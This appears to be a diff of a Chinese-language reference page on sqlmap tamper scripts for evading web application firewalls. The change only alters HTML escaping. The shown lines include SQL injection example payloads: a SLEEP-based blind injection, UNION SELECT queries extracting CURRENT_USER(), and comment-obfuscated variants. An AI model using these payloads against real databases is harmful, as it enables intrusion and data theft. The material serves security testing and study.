@@ -1834,9 +1834,9 @@ Example:
 Input: 1&#39; AND SLEEP(5)# 
 Output: MScgQU5EIFNMRUVQKDUpIw`
 
-(5) between.py 以”not between”替换”&gt;“ 
+(5) between.py 以”not between”替换”&amp;gt;“ 
 Example: 
-Input: &#39;A &gt; B&#39; 
+Input: &#39;A &amp;gt; B&#39; 
 Output: &#39;A NOT BETWEEN 0 AND B&#39;
 
 (6) bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“ 
@@ -1874,7 +1874,7 @@ Example:
 Input: value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa 
 Output: value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa 
 Requirement: 
-MySQL &lt; 5.1
+MySQL &amp;lt; 5.1
 
 (12) ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)” 
 Example: 
@@ -1887,15 +1887,15 @@ SAP MaxDB (possibly)
 
 (13) modsecurityversioned.py 条件注释 
 Example: 
-Input: 1 AND 2&gt;1-- 
-Output: 1 /*!30000AND 2&gt;1*/-- 
+Input: 1 AND 2&amp;gt;1-- 
+Output: 1 /*!30000AND 2&amp;gt;1*/-- 
 Requirement: 
 MySQL
 
 (14) modsecurityzeroversioned.py 条件注释，0000 
 Example: 
-Input: 1 AND 2&gt;1-- 
-Output: 1 /*!00000AND 2&gt;1*/-- 
+Input: 1 AND 2&amp;gt;1-- 
+Output: 1 /*!00000AND 2&amp;gt;1*/-- 
 Requirement: 
 MySQL
 
@@ -1958,7 +1958,7 @@ MySQL
 
 (24) space2morehash.py 没看出来和上面那个有什么区别。。 
 Requirement: 
-MySQL &gt;= 5.1.13
+MySQL &amp;gt;= 5.1.13
 
 (25) space2mssqlblank.py 以随机空白字符替换空格 
 Example: 
@@ -2023,7 +2023,7 @@ Example:
 Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
 Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
 Requirement: 
-MySQL &gt;= 5.1.13
+MySQL &amp;gt;= 5.1.13
 </pre></div>
 
 
